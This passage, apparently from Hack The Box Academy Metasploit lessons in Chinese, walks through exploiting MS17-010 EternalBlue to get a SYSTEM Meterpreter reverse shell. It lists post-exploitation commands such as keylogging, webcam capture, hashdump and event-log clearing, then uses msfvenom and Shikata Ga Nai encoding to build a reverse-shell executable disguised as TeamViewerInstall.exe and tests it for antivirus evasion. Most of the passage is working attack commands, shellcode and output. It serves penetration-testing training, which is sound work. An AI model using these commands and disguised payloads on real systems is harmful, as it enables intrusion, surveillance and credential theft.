payload => windows/x64/meterpreter/reverse_tcp
```

选择载荷后，我们将有更多可用选项。

MSF - 选择载荷

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

正如我们所见，通过在 Exploit 模块内部运行 `show payloads` 命令，msfconsole 已检测到目标是 Windows 机器，因此只显示了针对 Windows 操作系统的载荷。

我们还可以看到出现了一个新的选项字段，直接与载荷参数将包含的内容相关。我们将专注于 `LHOST` 和 `LPORT`（我们的攻击者 IP 和用于反向连接初始化的所需端口）。当然，如果攻击失败，我们总是可以使用不同的端口并重新启动攻击。

---

## 使用载荷

是时候为 Exploit 模块和载荷模块设置参数了。对于 Exploit 部分，我们需要设置以下内容：

|**参数**|**描述**|
|---|---|
|`RHOSTS`|远程主机的 IP 地址，即目标机器。|
|`RPORT`|不需要更改，只需检查我们是否在 SMB 运行的 445 端口上。|

对于载荷部分，我们需要设置以下内容：

|**参数**|**描述**|
|---|---|
|`LHOST`|主机的 IP 地址，即攻击者机器。|
|`LPORT`|不需要更改，只需检查端口是否未被使用。|

如果我们想快速检查我们的 LHOST IP 地址，我们总是可以直接从 msfconsole 菜单调用 `ifconfig` 命令。

#### MSF - 漏洞利用和载荷配置

MSF - 漏洞利用和载荷配置

```shell-session
msf6 exploit(**windows/smb/ms17_010_eternalblue**) > ifconfig

**[*]** exec: ifconfig

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1500

<SNIP>

inet 10.10.14.15 netmask 255.255.254.0 destination 10.10.14.15

<SNIP>


msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.15

LHOST => 10.10.14.15


msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40
```

然后，我们可以运行漏洞利用并查看它返回什么。查看下面输出中的差异：

MSF - 漏洞利用和载荷配置

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.15:4444
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158) at 2020-08-14 11:25:32 +0000
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


meterpreter > whoami

[-] Unknown command: whoami.


meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```

提示符不是 Windows 命令行提示符，而是 `Meterpreter` 提示符。通常用于 Windows 的 `whoami` 命令在这里不起作用。相反，我们可以使用 Linux 等效的 `getuid`。探索 `help` 菜单可以让我们进一步了解 Meterpreter 载荷的功能。

#### MSF - Meterpreter 命令

MSF - Meterpreter 命令

```shell-session
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    disable_unicode_encoding  Disables encoding of Unicode strings
    enable_unicode_encoding   Enables encoding of Unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    IRB                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session.
    transport                 Change the current transport mechanism
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Strap: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    cp            Copy source to destination
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
```
    getwd         打印工作目录
    LCD           更改本地工作目录
    lls           列出本地文件
    lpwd          打印本地工作目录
    ls            列出文件
    mkdir         创建目录
    mv            将源移动到目标位置
    PWD           打印工作目录
    rm            删除指定文件
    rmdir         删除目录
    search        搜索文件
    show_mount    列出所有挂载点/逻辑驱动器
    upload        上传文件或目录


Strap: Networking Commands（网络命令）
===========================

    Command       Description
    -------       -----------
    arp           显示主机 ARP 缓存
    get proxy      显示当前代理配置
    ifconfig      显示接口
    ipconfig      显示接口
    netstat       显示网络连接
    portfwd       将本地端口转发到远程服务
    resolve       在目标上解析一组主机名
    route         查看和修改路由表


Strap: System Commands（系统命令）
=======================

    Command       Description
    -------       -----------
    clearev       清除事件日志
    drop_token    放弃任何活动的模拟令牌（impersonation token，一种用于临时获取其他用户权限的凭证）
    execute       执行命令
    getenv        获取一个或多个环境变量值
    getpid        获取当前进程标识符
    getprivs      尝试启用当前进程可用的所有权限
    getsid        获取服务器运行用户的 SID（安全标识符）
    getuid        获取服务器运行的用户
    kill          终止进程
    localtime     显示目标系统的本地日期和时间
    pgrep         按名称过滤进程
    pkill         按名称终止进程
    ps            列出正在运行的进程
    reboot        重启远程计算机
    reg           修改并与远程注册表交互
    rev2self      在远程计算机上调用 RevertToSelf()（恢复原始安全上下文的 Windows API 函数）
    shell         进入系统命令 shell
    shutdown      关闭远程计算机
    steal_token   尝试从目标进程窃取模拟令牌
    suspend       挂起或恢复进程列表
    sysinfo       获取远程系统信息，如操作系统


Strap: User interface Commands（用户界面命令）
===============================

    Command        Description
    -------        -----------
    enumdesktops   列出所有可访问的桌面和窗口站
    getdesktop     获取当前 meterpreter 桌面
    idle time       返回远程用户空闲的秒数
    keyboard_send  发送按键
    keyevent       发送键盘事件
    keyscan_dump   导出按键缓冲区
    keyscan_start  开始捕获按键
    keyscan_stop   停止捕获按键
    mouse          发送鼠标事件
    screenshare    实时观看远程用户的桌面
    screenshot     截取交互式桌面的屏幕截图
    setdesktop     更改 meterpreter 的当前桌面
    uictl          控制部分用户界面组件


Stdapi: Webcam Commands（摄像头命令）
=======================

    Command        Description
    -------        -----------
    record_mic     从默认麦克风录制 X 秒音频
    webcam_chat    开始视频聊天
    webcam_list    列出摄像头
    webcam_snap    从指定摄像头拍摄快照
    webcam_stream  播放指定摄像头的视频流


Strap: Audio Output Commands（音频输出命令）
=============================

    Command       Description
    -------       -----------
    play          在目标系统上播放波形音频文件 (.wav)


Priv: Elevate Commands（提权命令）
======================

    Command       Description
    -------       -----------
    get system     尝试将权限提升到本地系统权限


Priv: Password database Commands（密码数据库命令）
================================

    Command       Description
    -------       -----------
    hashdump      导出 SAM 数据库（安全账户管理器，存储 Windows 用户账户信息）的内容


Priv: Timestamp Commands（时间戳命令）
========================

    Command       Description
    -------       -----------
    timestamp     操作文件 MACE 属性（修改时间、访问时间、创建时间、条目修改时间）
```

相当不错。从 SAM 中提取用户哈希到截屏和激活摄像头，所有这些都可以在类似 Linux 的命令行界面中轻松完成。进一步探索，我们还看到了打开 shell 通道的选项。这将使我们进入实际的 Windows 命令行界面。

#### MSF - Meterpreter 导航

MSF - Meterpreter Navigation

```shell-session
meterpreter > cd Users
meterpreter > ls

Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   8192  dir   2017-07-21 06:56:23 +0000  Administrator
40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  All Users
40555/r-xr-xr-x   8192  dir   2009-07-14 03:20:08 +0000  Default
40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  Default User
40555/r-xr-xr-x   4096  dir   2009-07-14 03:20:08 +0000  Public
100666/rw-rw-rw-  174   fil   2009-07-14 04:54:24 +0000  desktop.ini
40777/rwxrwxrwx   8192  dir   2017-07-14 13:45:33 +0000  haris


meterpreter > shell

Process 2664 created.
Channel 1 created.

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users>
```

`Channel 1` 已创建，我们自动进入了这台机器的命令行界面。这里的通道代表我们设备和目标主机之间的连接，这是通过 Meterpreter Stager（分阶段加载器）和 Stage（阶段载荷）使用反向 TCP 连接（从目标主机到我们）建立的。分阶段加载器在我们的机器上激活，等待由目标机器上的阶段载荷发起的连接请求。

进入目标的标准 shell 在某些情况下很有用，但 Meterpreter 也可以在受害者机器上导航和执行操作。因此我们看到命令已更改，但在系统中拥有相同的权限级别。

#### MSF - Windows CMD

MSF - Windows CMD

```shell-session
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users>dir

dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users

21/07/2017  07:56    <DIR>          .
21/07/2017  07:56    <DIR>          ..
21/07/2017  07:56    <DIR>          Administrator
14/07/2017  14:45    <DIR>          haris
12/04/2011  08:51    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  15,738,978,304 bytes free

C:\Users>whoami

whoami
nt authority\system
```

让我们看看还可以使用哪些其他类型的载荷。我们将研究与 Windows 操作系统相关的最常见载荷。

---

## 载荷类型

下表包含用于 Windows 机器的最常见载荷及其各自的描述。

|**Payload**|**Description**|
|---|---|
|`generic/custom`|通用监听器，多用途|
|`generic/shell_bind_tcp`|通用监听器，多用途，普通 shell，TCP 连接绑定|
|`generic/shell_reverse_tcp`|通用监听器，多用途，普通 shell，反向 TCP 连接|
|`windows/x64/exec`|执行任意命令（Windows x64）|
|`windows/x64/loadlibrary`|加载任意 x64 库路径|
|`windows/x64/messagebox`|通过 MessageBox 生成对话框，可自定义标题、文本和图标|
|`windows/x64/shell_reverse_tcp`|普通 shell，单一载荷，反向 TCP 连接|
|`windows/x64/shell/reverse_tcp`|普通 shell，分阶段加载器 + 阶段载荷，反向 TCP 连接|
|`windows/x64/shell/bind_ipv6_tcp`|普通 shell，分阶段加载器 + 阶段载荷，IPv6 绑定 TCP 分阶段加载器|
|`windows/x64/meterpreter/$`|Meterpreter 载荷 + 上述变体|
|`windows/x64/powershell/$`|交互式 PowerShell 会话 + 上述变体|
|`windows/x64/vncinject/$`|VNC 服务器（反射注入）+ 上述变体|

渗透测试人员在安全评估期间大量使用的其他关键载荷包括 Empire 和 Cobalt Strike 载荷。这些不在本课程范围内，但可以在空闲时间自行研究，因为它们可以提供大量关于专业渗透测试人员如何对高价值目标进行评估的见解。

除此之外，当然还有大量其他载荷。有些是针对特定设备供应商的，如 Cisco、Apple 或 PLC（可编程逻辑控制器）。有些我们可以使用 `msfvenom` 自己生成。然而，接下来我们将研究 `Encoders`（编码器）以及如何使用它们来影响攻击结果。#metasploit #Encoding #hacking [source](https://academy.hackthebox.com/module/39/section/409)


---

在 Metasploit Framework 存在的 15 年中，`Encoders`（编码器）帮助载荷与不同的处理器架构兼容，同时也帮助规避杀毒软件。`Encoders` 的作用是更改载荷以在不同的操作系统和架构上运行。这些架构包括：

|`x64`|`x86`|`sparc`|`ppc`|`mips`|
|---|---|---|---|---|

编码器还需要从载荷中删除称为 `bad characters`（坏字符，可能导致载荷失效的特定十六进制值）的十六进制操作码。不仅如此，以不同格式编码载荷也可以帮助规避如上所述的杀毒检测。然而，随着 IPS/IDS（入侵防御系统/入侵检测系统）制造商改进了其保护软件处理恶意软件和病毒签名的方式，严格用于杀毒规避的编码器使用已经随时间减少。

Shikata Ga Nai（`SGN`）是当今最常用的编码方案之一，因为它非常难以检测，以至于通过其机制编码的载荷不再是普遍无法检测的。远非如此。这个名称（`仕方がない`）意为"无可奈何"或"对此无能为力"，如果我们在几年前阅读这篇文章，这个名字确实恰如其分。然而，还有其他方法我们将探索以规避保护系统。[这篇 FireEye 的文章](https://www.fireeye.com/blog/threat-research/2019/10/shikata-ga-nai-encoder-still-going-strong.html)详细介绍了 Shikata Ga Nai 之前统治其他编码器的原因和方式。

---

## 选择编码器

在 2015 年之前，Metasploit Framework 有不同的子模块负责载荷和编码器。它们与 msfconsole 脚本分开打包，称为 `msfpayload` 和 `msfencode`。这两个工具位于 `/usr/share/framework2/`。

如果我们想创建自定义载荷，可以通过 `msfpayload` 完成，但之后必须根据目标操作系统架构使用 `msfencode` 进行编码。管道会将一个命令的输出传递给下一个命令，生成编码后的载荷，准备发送并在目标机器上运行。

```shell-session
tr01ax@htb[/htb]$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai

[*] x86/shikata_ga_nai succeeded with size 1636 (iteration=1)

my $buf =
"\xbe\x7b\xe6\xcd\x7c\xd9\xf6\xd9\x74\x24\xf4\x58\x2b\xc9" .
"\x66\xb9\x92\x01\x31\x70\x17\x83\xc0\x04\x03\x70\x13\xe2" .
"\x8e\xc9\xe7\x76\x50\x3c\xd8\xf1\xf9\x2e\x7c\x91\x8e\xdd" .
"\x53\x1e\x18\x47\xc0\x8c\x87\xf5\x7d\x3b\x52\x88\x0e\xa6" .
"\xc3\x18\x92\x58\xdb\xcd\x74\xaa\x2a\x3a\x55\xae\x35\x36" .
"\xf0\x5d\xcf\x96\xd0\x81\xa7\xa2\x50\xb2\x0d\x64\xb6\x45" .
"\x06\x0d\xe6\xc4\x8d\x85\x97\x65\x3d\x0a\x37\xe3\xc9\xfc" .
"\xa4\x9c\x5c\x0b\x0b\x49\xbe\x5d\x0e\xdf\xfc\x2e\xc3\x9a" .
"\x3d\xd7\x82\x48\x4e\x72\x69\xb1\xfc\x34\x3e\xe2\xa8\xf9" .
"\xf1\x36\x67\x2c\xc2\x18\xb7\x1e\x13\x49\x97\x12\x03\xde" .
"\x85\xfe\x9e\xd4\x1d\xcb\xd4\x38\x7d\x39\x35\x6b\x5d\x6f" .
"\x50\x1d\xf8\xfd\xe9\x84\x41\x6d\x60\x29\x20\x12\x08\xe7" .
"\xcf\xa0\x82\x6e\x6a\x3a\x5e\x44\x58\x9c\xf2\xc3\xd6\xb9" .

<SNIP>
```

2015 年之后，对这些脚本的更新将它们合并到 `msfvenom` 工具中，该工具负责载荷生成和编码。我们稍后将详细讨论 `msfvenom`。以下是今天使用 `msfvenom` 生成载荷的示例：

#### 生成载荷 - 不使用编码

Generating Payload - Without Encoding

```shell-session
tr01ax@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl

Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of perl file: 1674 bytes
my $buf =
"\xda\xc1\xba\x37\xc7\xcb\x5e\xd9\x74\x24\xf4\x5b\x2b\xc9" .
"\xb1\x59\x83\xeb\xfc\x31\x53\x15\x03\x53\x15\xd5\x32\x37" .
"\xb6\x96\xbd\xc8\x47\xc8\x8c\x1a\x23\x83\xbd\xaa\x27\xc1" .
"\x4d\x42\xd2\x6e\x1f\x40\x2c\x8f\x2b\x1a\x66\x60\x9b\x91" .
"\x50\x4f\x23\x89\xa1\xce\xdf\xd0\xf5\x30\xe1\x1a\x08\x31" .

<SNIP>
```

我们现在应该查看 `$buf` 的第一行，看看应用 `shikata_ga_nai` 编码器时它是如何变化的。

#### 生成载荷 - 使用编码

Generating Payload - With Encoding

```shell-session
tr01ax@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai

Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 326 (iteration=0)
x86/shikata_ga_nai succeeded with size 353 (iteration=1)
x86/shikata_ga_nai succeeded with size 380 (iteration=2)
x86/shikata_ga_nai chosen with final size 380
Payload size: 380 bytes
buf = ""
buf += "\xbb\x78\xd0\x11\xe9\xda\xd8\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x59\x31\x58\x13\x83\xc0\x04\x03\x58\x77\x32"
buf += "\xe4\x53\x15\x11\xea\xff\xc0\x91\x2c\x8b\xd6\xe9\x94"
buf += "\x47\xdf\xa3\x79\x2b\x1c\xc7\x4c\x78\xb2\xcb\xfd\x6e"
buf += "\xc2\x9d\x53\x59\xa6\x37\xc3\x57\x11\xc8\x77\x77\x9e"

<SNIP>
```

#### Shikata Ga Nai 编码

![](https://academy.hackthebox.com/storage/modules/39/shikata_ga_nai.gif) Source: https://hatching.io/blog/metasploit-payloads2/

如果我们想了解 `shikata_ga_nai` 编码器的工作原理，可以查看[这里](https://hatching.io/blog/metasploit-payloads2/)的一篇优秀文章。

假设我们想为`现有载荷`选择一个编码器。那么，我们可以在 `msfconsole` 中使用 `show encoders` 命令来查看当前 `Exploit 模块 + Payload` 组合可用的编码器。

Shikata Ga Nai Encoding

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp


msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders

Compatible Encoders
===================

   #  Name              Disclosure Date  Rank    Check  Description
   -  ----              ---------------  ----    -----  -----------
   0  generic/eicar                      manual  No     The EICAR Encoder
   1  generic/none                       manual  No     The "none" Encoder
   2  x64/xor                            manual  No     XOR Encoder
   3  x64/xor_dynamic                    manual  No     Dynamic key XOR Encoder
   4  x64/zutto_dekiru                   manual  No     Zutto Dekiru
```

在上一个示例中，我们只看到了几个适合 x64 系统的编码器。与可用载荷一样，这些编码器会根据 Exploit 模块自动过滤，只显示兼容的编码器。例如，让我们尝试 `MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference Exploit`。

Shikata Ga Nai Encoding

```shell-session
msf6 exploit(ms09_050_smb2_negotiate_func_index) > show encoders

Compatible Encoders
===================

   Name                    Disclosure Date  Rank       Description
   ----                    ---------------  ----       -----------
   generic/none                             normal     The "none" Encoder
   x86/alpha_mixed                          low        Alpha2 Alphanumeric Mixedcase Encoder
   x86/alpha_upper                          low        Alpha2 Alphanumeric Uppercase Encoder
   x86/avoid_utf8_tolower                   manual     Avoid UTF8/tolower
   x86/call4_dword_xor                      normal     Call+4 Dword XOR Encoder
   x86/context_cpuid                        manual     CPUID-based Context Keyed Payload Encoder
   x86/context_stat                         manual     stat(2)-based Context Keyed Payload Encoder
   x86/context_time                         manual     time(2)-based Context Keyed Payload Encoder
   x86/countdown                            normal     Single-byte XOR Countdown Encoder
   x86/fnstenv_mov                          normal     Variable-length Fnstenv/mov Dword XOR Encoder
   x86/jmp_call_additive                    normal     Jump/Call XOR Additive Feedback Encoder
   x86/nonalpha                             low        Non-Alpha Encoder
   x86/nonupper                             low        Non-Upper Encoder
   x86/shikata_ga_nai                       excellent  Polymorphic XOR Additive Feedback Encoder
   x86/single_static_bit                    manual     Single Static Bit
   x86/unicode_mixed                        manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
   x86/unicode_upper                        manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
```

以上示例仅作为假设性示例。如果我们只用 SGN 对可执行载荷编码一次，今天大多数杀毒软件可能会检测到它。让我们深入研究一下。使用 `msfvenom`（Framework 中处理载荷生成和编码方案的子脚本），我们有以下输入：

Shikata Ga Nai Encoding

```shell-session
tr01ax@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of exe file: 73802 bytes
Saved as: TeamViewerInstall.exe
```

这将生成一个 `exe` 格式的载荷，名为 TeamViewerInstall.exe，旨在适用于 Windows 平台的 x86 架构处理器，带有隐藏的 Meterpreter reverse_tcp shell 载荷，使用 Shikata Ga Nai 方案编码一次。让我们将结果上传到 VirusTotal。

![image](https://academy.hackthebox.com/storage/modules/39/S8_SS01.png)

一个更好的选择是尝试通过同一编码方案的多次迭代来运行它：

Shikata Ga Nai Encoding

```shell-session
tr01ax@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe

Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai succeeded with size 395 (iteration=1)
x86/shikata_ga_nai succeeded with size 422 (iteration=2)
x86/shikata_ga_nai succeeded with size 449 (iteration=3)
x86/shikata_ga_nai succeeded with size 476 (iteration=4)
x86/shikata_ga_nai succeeded with size 503 (iteration=5)
x86/shikata_ga_nai succeeded with size 530 (iteration=6)
x86/shikata_ga_nai succeeded with size 557 (iteration=7)
x86/shikata_ga_nai succeeded with size 584 (iteration=8)
x86/shikata_ga_nai succeeded with size 611 (iteration=9)
x86/shikata_ga_nai chosen with final size 611
Payload size: 611 bytes
Final size of exe file: 73802 bytes
Error: Permission denied @ rb_sysopen - /root/Desktop/TeamViewerInstall.exe
```

![image](https://academy.hackthebox.com/storage/modules/39/S8_SS02.png)

如我们所见，这对于杀毒规避仍然不够。仍有大量产品检测到该载荷。另外，Metasploit 提供了一个名为 `msf-virustotal` 的工具，我们可以使用 API 密钥来分析我们的载荷。但是，这需要在 VirusTotal 上免费注册。

#### MSF - VirusTotal

MSF - VirusTotal

```shell-session
tr01ax@htb[/htb]$ msf-virustotal -k <API key> -f TeamViewerInstall.exe

[*] Using API key: <API key>
[*] Please wait while I upload TeamViewerInstall.exe...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : 4f54cc46e2f55be168cc6114b74a3130
[*] Sample SHA1 hash   : 53fcb4ed92cf40247782de41877b178ef2a9c5a9
[*] Sample SHA256 hash : 66894cbecf2d9a31220ef811a2ba65c06fdfecddbc729d006fdab10e43368da8
[*] Analysis link: https://www.virustotal.com/gui/file/<SNIP>/detection/f-<SNIP>-1651750343
[*] Requesting the report...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Analysis Report: TeamViewerInstall.exe (51 / 68): 66894cbecf2d9a31220ef811a2ba65c06fdfecddbc729d006fdab10e43368da8
==================================================================================================================

 Antivirus             Detected  Version                                                         Result                                                     Update
 ---------             --------  -------                                                         ------                                                     ------
 ALYac                 true      1.1.3.1                                                         Trojan.CryptZ.Gen                                          20220505
 APEX                  true      6.288                                                           Malicious                                                  20220504
 AVG                   true      21.1.5827.0                                                     Win32:SwPatch [Wrm]                                        20220505
 Acronis               true      1.2.0.108                                                       suspicious                                                 20220426
 Ad-Aware              true      3.0.21.193                                                      Trojan.CryptZ.Gen                                          20220505
 AhnLab-V3             true      3.21.3.10230                                                    Trojan/Win32.Shell.R1283                                   20220505
 Alibaba               false     0.3.0.5                                                                                                                    20190527
 Antiy-AVL             false     3.0                                                                                                                        20220505
 Arcabit               true      1.0.0.889                                                       Trojan.CryptZ.Gen                                          20220505
 Avast                 true      21.1.5827.0                                                     Win32:SwPatch [Wrm]                                        20220505
 Avira                 true      8.3.3.14                                                        TR/Patched.Gen2                                            20220505
 Baidu                 false     1.0.0.2                                                                                                                    20190318
 BitDefender           true      7.2                                                             Trojan.CryptZ.Gen                                          20220505
 BitDefenderTheta      true      7.2.37796.0                                                     Gen:NN.ZexaF.34638.eq1@aC@Q!ici                            20220428
 Bkav                  true      1.3.0.9899                                                      W32.FamVT.RorenNHc.Trojan                                  20220505
 CAT-QuickHeal         true      14.00                                                           Trojan.Swrort.A                                            20220505
 CMC                   false     2.10.2019.1                                                                                                                20211026
 ClamAV                true      0.105.0.0                                                       Win.Trojan.MSShellcode-6360728-0                           20220505
 Comodo                true      34592                                                           TrojWare.Win32.Rozena.A@4jwdqr                             20220505
 CrowdStrike           true      1.0                                                             win/malicious_confidence_100% (D)                          20220418
 Cylance               true      2.3.1.101                                                       Unsafe                                                     20220505
 Cynet                 true      4.0.0.27                                                        Malicious (score: 100)                                     20220505
 Cyren                 true      6.5.1.2                                                         W32/Swrort.A.gen!Eldorado                                  20220505
 DrWeb                 true      7.0.56.4040                                                     Trojan.Swrort.1                                            20220505
 ESET-NOD32            true      25218                                                           a variant of Win32/Rozena.AA                               20220505
 Elastic               true      4.0.36                                                          malicious (high confidence)                                20220503
 Emsisoft              true      2021.5.0.7597                                                   Trojan.CryptZ.Gen (B)                                      20220505
 F-Secure              false     18.10.978-beta,1651672875v,1651675347h,1651717942c,1650632236t                                                             20220505
 FireEye               true      35.24.1.0                                                       Generic.mg.4f54cc46e2f55be1                                20220505
 Fortinet              true      6.2.142.0                                                       MalwThreat!0971IV                                          20220505
 GData                 true      A:25.32960B:27.27244                                            Trojan.CryptZ.Gen                                          20220505
 Gridinsoft            true      1.0.77.174                                                      Trojan.Win32.Swrort.zv!s2                                  20220505
 Ikarus                true      6.0.24.0                                                        Trojan.Win32.Swrort                                        20220505
 Jiangmin              false     16.0.100                                                                                                                   20220504
 K7AntiVirus           true      12.10.42191                                                     Trojan ( 001172b51 )                                       20220505
 K7GW                  true      12.10.42191                                                     Trojan ( 001172b51 )                                       20220505
 Kaspersky             true      21.0.1.45                                                       HEUR:Trojan.Win32.Generic                                  20220505
 Kingsoft              false     2017.9.26.565                                                                                                              20220505
 Lionic                false     7.5                                                                                                                        20220505
 MAX                   true      2019.9.16.1                                                     malware (ai score=89)                                      20220505
 Malwarebytes          true      4.2.2.27                                                        Trojan.Rozena                                              20220505
 MaxSecure             true      1.0.0.1                                                         Trojan.Malware.300983.susgen                               20220505
 McAfee                true      6.0.6.653                                                       Swrort.i                                                   20220505
 McAfee-GW-Edition     true      v2019.1.2+3728                                                  BehavesLike.Win32.Swrort.lh                                20220505
 MicroWorld-eScan      true      14.0.409.0                                                      Trojan.CryptZ.Gen                                          20220505
 Microsoft             true      1.1.19200.5                                                     Trojan:Win32/Meterpreter.A                                 20220505
 NANO-Antivirus        true      1.0.146.25588                                                   Virus.Win32.Gen-Crypt.ccnc                                 20220505
 Paloalto              false     0.9.0.1003                                                                                                                 20220505
 Panda                 false     4.6.4.2                                                                                                                    20220504
